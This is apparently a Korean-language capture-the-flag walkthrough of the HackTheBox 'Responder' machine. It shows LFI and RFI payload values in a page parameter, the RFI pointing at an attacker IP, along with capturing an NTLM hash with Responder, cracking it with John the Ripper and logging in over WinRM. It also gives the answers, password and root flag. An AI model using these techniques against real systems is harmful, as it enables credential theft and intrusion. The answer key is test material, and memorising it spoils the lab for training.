# Responder

## Workstation
- Virtual Box : VMware Workstation 16 Pro
- OS : kali-linux-2022.3

## Walkthrough
* CONNECT | Connect to Starting Point VPN before starting the machine

```
sudo openvpn starting_Point_<ID>.ovpn
```

* Spawn Machine | Click to Spawn the machine

![machine](https://github.com/jasperkim425/Walkthrough/blob/main/HackTheBox/Starting%20Point/Responder/image/machine.png)

* Task 1 | When visiting the web service using the IP address, what is the domain that we are being redirected to?

> unika.htb

nmap으로 포트 검색을 한다.

![nmap](https://github.com/jasperkim425/Walkthrough/blob/main/HackTheBox/Starting%20Point/Responder/image/nmap.png)

80번 포트가 열려있으니 IP 주소를 브라우저에 검색하면 도메인 네임이 나온다.

![ip](https://github.com/jasperkim425/Walkthrough/blob/main/HackTheBox/Starting%20Point/Responder/image/ip.png)

해당 IP 주소를 사용하기 위해 hosts 파일에 입력한다.

![hosts](https://github.com/jasperkim425/Walkthrough/blob/main/HackTheBox/Starting%20Point/Responder/image/hosts.png)

* Task 2 | Which scripting language is being used on the server to generate webpages?

> php

스크립트 언어를 알기 위해 이것저것 눌러보던 중 프랑스어로 바꿔보니 index.php 파일을 사용하고 있었다.

![fr](https://github.com/jasperkim425/Walkthrough/blob/main/HackTheBox/Starting%20Point/Responder/image/fr.png)

* Task 3 | What is the name of the URL parameter which is used to load different language versions of the webpage?

> page

index.php 뒤에 `?` 파라미터 값에 page가 있다.

* Task 4 | Which of the following values for the `page` parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"

> ../../../../../../../../windows/system32/drivers/etc/hosts 

LFI란 Local File Inclusion으로 해석하면 로컬 파일 포함이란 취약점이다. 웹 서버의 파일을 노출하거나 실행할 수 있는 공격이다.

우리는 LFI 취약점으로 웹 서버의 파일을 읽어낼 것이다.

![lfi](https://github.com/jasperkim425/Walkthrough/blob/main/HackTheBox/Starting%20Point/Responder/image/lfi.png)

* Task 5 | Which of the following values for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"

> //10.10.14.6/somefile 

RFI란 Remote File Inclusion으로 해석하면 원격 파일 포함으로 웹 응용 프로그램이 원격 파일을 실행할 수 있으며 웹쉡도 가져올 수 있다.

![rfi](https://github.com/jasperkim425/Walkthrough/blob/main/HackTheBox/Starting%20Point/Responder/image/rfi.png)

* Task 6 | What does NTLM stand for?

> New Technology Lan Manager 

* Task 7 | Which flag do we use in the Responder utility to specify the network interface?

> -I 

Responder의 사용법을 확인하면 된다.

![responder](https://github.com/jasperkim425/Walkthrough/blob/main/HackTheBox/Starting%20Point/Responder/image/responder.png)

네트워크 인터페이스의 옵션을 알았으니 `-I` 옵션과 `tun0`을 입력한다.

중간에 event 요청을 하는데 이때 Task 5의 RFI 를 이용하면 된다.

브라우저 파라미터 값에 `//<IP>/somefile`를 입력하면 된다.

![rfiip](https://github.com/jasperkim425/Walkthrough/blob/main/HackTheBox/Starting%20Point/Responder/image/rfiip.png)

그러면 smb 부분에 관리자의 해시값이 나왔다.

![smb](https://github.com/jasperkim425/Walkthrough/blob/main/HackTheBox/Starting%20Point/Responder/image/smb.png)

* Task 8 | There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?.

> john the ripper 

위에서 얻은 해시값을 크랙하기 위해 john the ripper 모듈을 사용한다. 해시값을 hash.txt 파일에 입력하여 크랙한다.

![john](https://github.com/jasperkim425/Walkthrough/blob/main/HackTheBox/Starting%20Point/Responder/image/john.png)

* Task 9 | What is the password for the administrator user?

> badminton

* Task 10 | We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?

> 5985

* Submit Flag | Submit root flag 

> ea81b7afddd03efaa0945333ed147fac

위에서 Administrator의 패스워드 badminton을 얻었다.

위 계정을 이용해 window 계정에 접속하기 위해 윈도우 원격에서 접근하고 제어할 수 있는 win-rm 모듈을 사용한다.

![winrm](https://github.com/jasperkim425/Walkthrough/blob/main/HackTheBox/Starting%20Point/Responder/image/winrm.png)

성공적으로 윈도우 시스템에 접속되었다.

이제 flag를 찾으면 된다.

![flag](https://github.com/jasperkim425/Walkthrough/blob/main/HackTheBox/Starting%20Point/Responder/image/flag.png)
